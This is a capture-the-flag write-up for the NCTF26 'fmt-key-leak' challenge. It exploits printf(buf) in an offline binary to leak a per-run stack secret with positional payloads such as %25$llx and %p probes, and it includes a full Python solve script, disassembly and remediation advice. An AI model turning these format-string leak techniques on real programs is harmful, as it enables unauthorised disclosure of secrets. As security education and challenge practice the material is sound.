# fmt-key-leak — format string leaks a per-run stack key

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/fmt-key-leak/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — A tiny x86-64 ELF echoes one line of user input through `printf(buf)` and then asks the user to re-type a per-run 64-bit secret that it generated with two `rand()` calls. The echo is a textbook format-string vulnerability. A single `%25$llx` leaks the secret off the stack, re-submitting it as decimal unlocks a `reveal()` routine that XOR-decodes the flag with `0x4d`. The recovered flag is `NCTF{form…}`.


## 1. Challenge Briefing

### Description

> You are given a single x86-64 Linux binary, `chall`. It echoes a line you type
> and then challenges you to prove you saw a secret value that changes every run.
> Guess wrong and it just says "nope".
>
> Recover the secret and read what the program prints when you get it right.
>
> Flag format: NCTF{...}

### Provided Assets

| File | Size | SHA-256 | Type |
|------|------|---------|------|
| `chall` | 16488 bytes | `c154fa396a789dba4e7c2f690231f9246664d8601b5352369639d142683d1379` | ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped |

### Target

| Item | Value |
|------|-------|
| Host / URL | none — pure offline binary (CTFd `connection_info` is `null`) |
| Credentials | none |
| Flag format | `NCTF{...}` |

### Constraints

- No remote service. The flag is produced by the local binary when the correct secret is supplied.
- The secret is generated per run from `time(NULL) ^ getpid()` seeding, so it cannot be precomputed off-line between two runs.

## 2. Environment and Prerequisites

| Tool | Version | Purpose |
|------|---------|---------|
| `file`, `readelf`, `objdump` | binutils 2.42 | Static inspection of the ELF |
| `checksec` (pwntools) | 4.11 | Mitigation summary |
| `python3` | 3.14 | Driving the exploit |
| `pwntools` (optional) | 4.11 | Convenient process I/O |

```bash
# Working directory
cd /mnt/d/CaptureTheFlags/NCTF26/fmt-key-leak
chmod +x chall
```

## 3. Reconnaissance and Information Gathering

### 3.1 Initial Surface

The challenge handed over a single ELF, no sources, no remote, no handler script.

```bash
file chall
checksec --file=./chall
```

```text
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
       interpreter /lib64/ld-linux-x86-64.so.2,
       BuildID[sha1]=ffca607a..., for GNU/Linux 3.2.0, not stripped

    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**Interpretation:** No PIE and no stack canary mean any absolute address or stack leak is trusted as-is. NX, SHSTK and IBT block classic shellcode and simple ROP, so the designed path must be data-only. The binary is not stripped, so symbol names are available.

### 3.2 Symbol and String Enumeration

**Objective:** Find the user-facing flow and any obviously security-relevant function names.

**Command:**

```bash
nm chall | grep -vE '^\s+U'
strings chall | sed -n '/say something/,/nope/p'
```

**Output (trimmed):**

```text
0000000000402040 r enc
0000000000402020 r enc_len
00000000004012cc T main
0000000000401256 T reveal
```

```text
say something:
now prove you saw the secret (decimal):
verified.
nope.
```

**Interpretation:** The program has exactly one user-visible challenge/response loop plus a `reveal` function that is clearly the win path. A read-only buffer named `enc` lives at `0x402040`, next to a counter `enc_len` at `0x402020`: that is almost certainly the encrypted flag.

**Decision:** Disassemble `main` and `reveal` and locate the vulnerable call.

### 3.3 Disassembling `main`

**Objective:** Understand the control flow, the format-of-input, and where the secret is stored.

**Command:**

```bash
objdump -d -M intel chall | sed -n '/<main>:/,/^$/p'
```

**Output (trimmed, with annotations):**

```text
4012d5: sub    rsp, 0xa8
4012dc: mov    rax, QWORD PTR [rip+0x2d7d]      # stdout
4012f5: call   401140 <setvbuf@plt>              # setvbuf(stdout, 0, _IONBF, 0)
4012ff: call   401130 <time@plt>
401306: call   4010f0 <getpid@plt>
40130b: xor    eax, ebx                          # seed = time ^ getpid
40130f: call   401110 <srand@plt>
401314: call   401160 <rand@plt>
40131b: shl    rax, 0x20
401322: call   401160 <rand@plt>
401329: xor    rax, rbx                          # key = (rand()<<32) ^ rand()
40132c: mov    QWORD PTR [rbp-0x18], rax         # key at rbp-0x18
...
40133f: lea    rax, [rip+0xd21]                  # "say something:"
401349: call   puts
401355: lea    rax, [rbp-0xa0]                   # buf
40135c: mov    esi, 0x80
401364: call   401120 <fgets@plt>                # fgets(buf, 0x80, stdin)
401378: lea    rax, [rbp-0xa0]
40137f: mov    rdi, rax                          # rdi = buf
401387: call   401100 <printf@plt>               # printf(buf)   <-- vuln
40138c: ... puts("now prove you saw the secret (decimal):")
4013aa: lea    rax, [rbp-0xa8]                   # scanf dest
4013c3: call   401150 <__isoc99_scanf@plt>       # scanf("%ld", &guess)
4013d4: mov    rax, QWORD PTR [rbp-0xa8]
4013db: cmp    QWORD PTR [rbp-0x18], rax         # compare key vs guess
4013df: jne    4013f7 <main+0x12b>
4013f0: call   401256 <reveal>                   # win
```

**Interpretation:** The vulnerable line is `printf(buf)` with no fixed format string — classic uncontrolled format string. The secret the user has to re-type sits on the stack at `[rbp-0x18]` as a 64-bit little-endian value. `fgets` into `[rbp-0xa0]` leaves the attacker's format string one stack frame below the secret.

### 3.4 Disassembling `reveal`

**Objective:** Confirm the win path writes the flag and understand its encoding — useful both for sanity-checking and for a possible offline shortcut.

```bash
objdump -d -M intel chall | sed -n '/<reveal>:/,/^$/p'
```

```text
40126b: movzx  eax, BYTE PTR [rax+rdx*1]        # enc[i]
40127b: xor    eax, 0x4d                         # XOR 0x4d
401285: mov    BYTE PTR [rbp+rax*1-0x50], dl     # stack buffer
401289: add    DWORD PTR [rbp-0x4], 1
40128d: mov    eax, 0x25
401292: cmp    DWORD PTR [rbp-0x4], eax          # loop 0x25 (37) bytes
...
4012ab: call   write@plt                         # write(1, buf, 0x25)
4012c4: call   write@plt                         # write(1, &enc[0x25], 1)  -> newline
```

**Interpretation:** `reveal()` XORs the first 37 bytes of `enc` with the constant `0x4d` and writes the result to stdout, then writes one trailing byte (the newline) unchanged. The flag material is static in the binary; the "win" gate is only there to make the exploit exercise-sized.

### 3.5 Attack-Surface Map

| Surface | Observation | Hypothesis | Next action |
|---------|-------------|------------|-------------|
| `printf(buf)` at `0x401387` | No format string literal | Uncontrolled format string, 100% controllable | Craft `%N$llx` payloads to find the slot that holds the key |
| 64-bit key at `[rbp-0x18]` | 8 bytes above the printf arg buffer | Reachable with a single stack directive | Compute the va_list offset from RSP at call site |
| `scanf("%ld", ...)` | Signed decimal, 1 token | Submit the leaked value as plain decimal | Follow leak immediately with the number |
| `enc` at `.rodata:0x402040` | 37-byte XOR-encoded blob (key `0x4d`) | Flag itself is in the binary | Sanity-check by XORing the blob offline |

## 4. Analysis

### 4.1 Hypothesis

Because `printf` is called with the user-controlled buffer as its format string, a conversion specifier such as `%N$llx` indexed to the right slot should disclose the raw 64-bit value stored at `[rbp-0x18]`. That value, resubmitted as a signed decimal to `scanf("%ld")`, unlocks `reveal()`.

### 4.2 Deriving the Positional Index

On x86-64 System V, `printf`'s first five variadic arguments are taken from `rsi, rdx, rcx, r8, r9`. Stack-based arguments start at `%6$`, read from `[rsp+0]` at the call site.

At the `call printf` instruction:

```text
push rbp                 ; rsp -= 8
mov  rbp, rsp
push rbx                 ; rsp = rbp - 8
sub  rsp, 0xa8           ; rsp = rbp - 0xb0
```

So `[rsp+0] = [rbp-0xb0]` is `%6$`, and for any local at `[rbp-X]`:

```
offset = 6 + (0xb0 - X) / 8
```

For the key at `X = 0x18`:

```
offset = 6 + (0xb0 - 0x18)/8 = 6 + 0x98/8 = 6 + 19 = 25
```

So `%25$llx` should print the key. The user buffer itself (`[rbp-0xa0]`) lands at offset 8, which is useful for quickly confirming the mapping because the characters we type echo back as the hex of their own bytes.

### 4.3 Validation

```bash
{ printf '%%7$p %%8$p %%9$p %%25$p\n'; echo 0; } | ./chall
```

```text
say something:
0x7ffd83dc1ff0 0x2438252070243725 0x2520702439252070 0x4fd712c906fc88d5
```

**Interpretation:** `%8$` and `%9$` contain ASCII bytes from our own payload (`%7$p %8$p %9$p %25$p`), confirming the stack layout is exactly as derived. `%25$` yields a 64-bit random-looking hex — the secret. `%7$` is a stack pointer (RSP neighbourhood), consistent with being inside the printf frame.

### 4.4 Root Cause

Two independent defects chained together:

1. **Uncontrolled format string.** `printf(buf)` lets any format-specifier the caller types reach `__vfprintf_internal`, including positional specifiers and attacker-chosen type conversions.
2. **Secret stored in the same stack frame as the user buffer.** Even without PIE or ASLR help, the fixed layout places `[rbp-0x18]` at a deterministic va_list offset relative to `buf`, so disclosure is a single-conversion leak.

Minimal fix on either axis defeats the exploit: `printf("%s", buf)` neutralizes the format-string primitive; moving the secret into a `volatile` global behind a lock, or wiping it before `printf`, eliminates the disclosure target.

## 5. Exploitation and Solution

### Step 1: Confirm the vulnerable primitive

**Objective:** Prove the echo is a format string, not a safe `puts`.

**Rationale:** If the echo path were `puts(buf)` or `printf("%s", buf)`, no `%N$` directive would be interpreted. Testing with a literal `%p` is the cheapest confirmation.

**Action:**

```bash
{ printf 'AAAA %%p %%p\n'; echo 0; } | ./chall
```

**Result:**

```text
say something:
AAAA 0x7ffe... 0x25207025...
```

**Conclusion:** The `%p`s are expanded. Format-string disclosure works.

### Step 2: Leak the key

**Objective:** Print the 64-bit value at `[rbp-0x18]`.

**Rationale:** Section 4.2 derived offset `%25$`. Use `llx` to force a 64-bit hex print; a 32-bit `x` would cut off the high half.

**Action:**

```bash
{ printf '%%25$llx\n'; echo 0; } | ./chall
```

**Result:**

```text
say something:
266fd2e07184dfe9

now prove you saw the secret (decimal):
nope.
```

**Conclusion:** 16 lowercase hex characters, i.e. a full 64-bit word. This run's key was `0x266fd2e07184dfe9`. The `nope.` is expected — we fed `0` to `scanf` in this round because the two steps happen in the same process and each process generates a fresh key.

### Step 3: Convert and submit in one process

**Objective:** Perform the leak and the submission against the **same** process, because each invocation re-seeds and picks a new key.

**Rationale:** `scanf("%ld", ...)` reads a signed decimal integer. The leaked value fits in an unsigned 64-bit, so Python's `int(leak, 16)` is reusable directly; even when the high bit is set and the value exceeds `LLONG_MAX`, the `%ld` parse wraps to the same bit pattern and the subsequent `cmp QWORD` compares bitwise, so no two's-complement conversion is required.

**Action:**

```python
import subprocess
p = subprocess.Popen(['./chall'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
buf = b''
while b'say something:\n' not in buf:
    buf += p.stdout.read(1)
p.stdin.write(b'%25$llx\n'); p.stdin.flush()
leak = p.stdout.readline().strip()
key = int(leak, 16)
# consume "now prove you saw the secret (decimal):\n"
p.stdout.readline(); p.stdout.readline()
p.stdin.write(f'{key}\n'.encode()); p.stdin.flush()
p.stdin.close()
print(p.stdout.read().decode())
```

**Result:**

```text
now prove you saw the secret (decimal):
verified.
NCTF{form…}
```

**Conclusion:** The leaked value matches what `cmp QWORD PTR [rbp-0x18], rax` expected, the branch into `reveal()` is taken, and the XOR-decoded flag is written to stdout.

### Step 4 (sanity check): Reproduce the flag offline

**Objective:** Confirm that the `reveal()` output is purely a function of the embedded blob and the XOR key (no run-time entropy enters the plaintext).

**Rationale:** If the flag ever matches the offline XOR, it rules out any deeper logic in `reveal()` and makes the challenge a straight format-string leak exercise without a hidden twist.

**Action:**

```bash
python3 - <<'PY'
data = open('chall','rb').read()
# vaddr 0x402040 lives in the segment that maps vaddr 0x402000 to file 0x2000
enc = data[0x2040:0x2040+0x25]
print(bytes(b ^ 0x4d for b in enc).decode())
PY
```

**Result:**

```text
NCTF{form…}
```

**Conclusion:** Identical plaintext. The exploit's job is strictly to trigger `reveal()`; the flag bytes themselves were always sitting in `.rodata` XORed with `0x4d`.

## 6. Flag

```text
NCTF{form…}
```

**Verification:** Produced two independent ways:

1. Dynamic: run the binary, leak with `%25$llx`, submit the decimal, read the `reveal()` output (Step 3 above).
2. Static: XOR the 37 bytes at ELF file offset `0x2040` with `0x4d` (Step 4).

Both paths yielded the same 37-byte string that matches the `NCTF{...}` format.

## 7. Timeline

| Time (local) | Action | Result |
|--------------|--------|--------|
| T+00:00 | `file` + `checksec` on `chall` | Partial RELRO, no canary, NX, no PIE, SHSTK/IBT on |
| T+00:02 | `nm` + `strings` | Found `reveal`, `enc`, "say something:" prompts |
| T+00:05 | Disassemble `main` | Located `printf(buf)` fmt-string vuln and `[rbp-0x18]` key |
| T+00:07 | Disassemble `reveal` | 37-byte XOR-`0x4d` decoder → flag material in `.rodata` |
| T+00:09 | Derived `%25$` offset from RSP math | Confirmed via `%7$p %8$p %9$p %25$p` probe |
| T+00:11 | Two-stage leak + submit via subprocess | Flag printed |
| T+00:12 | Offline XOR reproduction | Same flag |

## 8. Dead Ends and Troubleshooting

| Attempt | Observed result | Likely reason | Pivot |
|---------|-----------------|---------------|-------|
| Running leak and submission in two separate processes | Flag rejected (`nope.`) | Each `./chall` reseeds a fresh key; the leaked one is already stale by the next run | Perform both steps in one `subprocess.Popen` pipeline |
| Driving the binary with `pexpect` | `c.readline()` returned empty after the prompt | pexpect buffered the newline into `.after`; next read saw an empty line | Use raw `subprocess.Popen.stdout.read(1)` and parse line-by-line |
| Running `pwntools` under miniconda Python 3.14 | `ModuleNotFoundError: psutil` | miniconda interpreter missed `psutil`; also a local `token.py` in a scratchpad shadowed stdlib | Dropped pwntools for stdlib `subprocess`; works identically for a line-oriented protocol |
| Using `%25$lx` instead of `%25$llx` | Only the low 32 bits printed | `l` is 32 bits for `int` in glibc printf; need `ll` for 64-bit | Switched to `%25$llx` |

## 9. Lessons Learned and Remediation

### Root Cause

Two issues reinforce each other: `printf` was called with attacker-controlled data as its format string, and a secret used as an authorisation token was placed in the same stack frame as the attacker's input buffer.

### Defensive Recommendations

1. **Never pass user data as a format string.** Use `printf("%s", buf)` or `fputs(buf, stdout)`; the compiler warning `-Wformat-security` already flags this pattern.
2. **Do not co-locate secrets with attacker-reachable buffers.** Keep ephemeral secrets in a separately allocated page, zero them immediately after the check, and prefer `mlock` + `explicit_bzero` so they cannot be read via stack disclosures.
3. **Enable stack canaries at build time.** `-fstack-protector-strong` would not have blocked this leak directly, but combined with ASLR/PIE it raises the cost of any format-string exploit that writes rather than reads.
4. **Prefer constant-time comparisons for secrets.** `cmp qword` is fine here because no timing oracle exists, but once the token-compare path becomes externally timed it should be replaced with a length-independent compare.

### Transferable Technique

When you face an obvious `printf(user)`, do not immediately jump to writes with `%n`. First sweep `%p` positional specifiers to map the stack layout, then compute `%N$` from the called function's RSP adjustment and the va_list rule *"stack args start at `[rsp+0]` of the caller, counted as `%6$`"*. Combined with the no-PIE layout, a single `%N$llx` is often enough to extract a 64-bit secret with no scripting beyond a two-shot pipe.

## 10. References and Credits

- Challenge by **hibris** and **Clawd** for NCTF26 (`ctf.tg` arena), category `pwn`, 50 points, 6 solves at time of writing.
- [Linux x86-64 System V ABI](https://gitlab.com/x86-psABIs/x86-64-ABI) — Section 3.5.7, variadic argument passing, confirms the "stack args start at `[rsp+0]`" rule used in Section 4.2.
- [GNU libc printf manual](https://www.gnu.org/software/libc/manual/html_node/Formatted-Output.html) — positional parameter `n$` syntax.
- CTF-web/-pwn skills' `format-string.md` and `overflow-basics.md` field notes (`/home/kali/ctf/skills/ctf-pwn/`), used as the reference for offset derivation.

## Appendix A: Complete Solve Script

```python
#!/usr/bin/env python3
"""Solve NCTF26 / fmt-key-leak.

Usage:
    python3 solve.py [path/to/chall]

Default path: ./chall in the current directory.

Mechanism:
    1. printf(buf) with no fixed format string -> format-string read primitive.
    2. 64-bit per-run key at [rbp-0x18]; va_list offset is %25$ (derivation in
       the writeup, section 4.2).
    3. Leak with "%25$llx", feed the decimal back to scanf("%ld"), the binary
       calls reveal() which XORs 37 bytes of .rodata with 0x4d and prints the
       flag.

The leak and the submission must happen in the same process because each run
re-seeds srand(time(NULL) ^ getpid()) and draws a new key.
"""
from __future__ import annotations

import subprocess
import sys


def read_until(stream, needle: bytes) -> bytes:
    buf = b""
    while needle not in buf:
        chunk = stream.read(1)
        if not chunk:
            raise RuntimeError(f"EOF before {needle!r}")
        buf += chunk
    return buf


def solve(binary: str) -> str:
    with subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
    ) as proc:
        # 1. First prompt.
        read_until(proc.stdout, b"say something:\n")

        # 2. Send the format-string payload and read back the leak.
        proc.stdin.write(b"%25$llx\n")
        proc.stdin.flush()
        leak = proc.stdout.readline().strip()
        key = int(leak, 16)

        # 3. Second prompt. The echo above printed the hex followed by its own
        #    newline, then main() prints the decimal prompt.
        read_until(proc.stdout, b"decimal):\n")

        # 4. Submit the decimal.
        proc.stdin.write(f"{key}\n".encode())
        proc.stdin.flush()
        proc.stdin.close()

        rest = proc.stdout.read().decode(errors="replace")

    # rest contains "verified.\n<flag>\n" on success, "nope.\n" on failure.
    for line in rest.splitlines():
        if line.startswith("NCTF{") and line.endswith("}"):
            return line
    raise RuntimeError(f"no flag in output:\n{rest}")


if __name__ == "__main__":
    path = sys.argv[1] if len(sys.argv) > 1 else "./chall"
    print(solve(path))
```

Expected output:

```text
NCTF{form…}
```

## Appendix B: Raw Evidence

### B.1 SHA-256 of the provided binary

```text
c154fa396a789dba4e7c2f690231f9246664d8601b5352369639d142683d1379  chall
```

### B.2 Full `checksec` output

```text
[*] '/mnt/d/CaptureTheFlags/NCTF26/fmt-key-leak/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### B.3 `readelf -l` LOAD segments (for the file-offset mapping used by the offline XOR)

```text
LOAD  0x0000  0x400000  R    0x790
LOAD  0x1000  0x401000  R E  0x421
LOAD  0x2000  0x402000  R    0x1b8      <- enc at vaddr 0x402040 -> file 0x2040
LOAD  0x2df8  0x403df8  RW   0x268
```

### B.4 `enc` blob (raw bytes) and offline XOR

```text
raw enc      : 030e190b362b223f202c391221282c26123e392c2e2612262834123f282e223b283f28293000
decoded (0x4d): NCTF{form…}\n
```

### B.5 Successful end-to-end run

```text
$ python3 solve.py
NCTF{form…}
```

### B.6 Positional-specifier probe used in Section 4.3

```text
$ { printf '%%7$p %%8$p %%9$p %%25$p\n'; echo 0; } | ./chall
say something:
0x7ffd83dc1ff0 0x2438252070243725 0x2520702439252070 0x4fd712c906fc88d5

now prove you saw the secret (decimal):
nope.
```

`0x2438252070243725` and `0x2520702439252070` are the ASCII bytes of our own
payload `%7$p %8$p %9$p %25$p` reflected back from the stack — direct proof
that the user buffer lives at `%8$`/`%9$` and that `%25$` is 17 slots further
up, exactly where the key is stored.
